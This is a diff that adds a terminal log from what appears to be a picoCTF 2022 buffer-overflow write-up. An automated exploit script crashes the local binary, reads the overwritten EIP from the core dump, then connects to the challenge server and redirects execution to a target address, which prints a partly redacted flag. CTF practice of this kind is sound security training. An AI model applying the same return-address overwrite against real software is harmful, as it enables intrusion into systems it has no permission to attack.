@@ -1,0 +1,16 @@
+[0;31m$[0m python3 buffer-overflow-1-automated.py REMOTE
+[[0;36m+[0m] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2601
+[[0;34m*[0m] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2601)
+[[0;36m+[0m] Parsing corefile...: Done
+[[0;34m*[0m] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
+    Arch:      i386-32-little
+    EIP:       0x6161616c
+    ESP:       0xff829260
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
+    Fault:     0x6161616c
+[[0;36m+[0m] Opening connection to saturn.picoctf.net on port [0;90m[PORT][0m: Done
+[[0;34m*[0m] Switching to interactive mode
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_[0;90m[REDACTED][0m}
+[[0;34m*[0m] Got EOF while reading in interactive
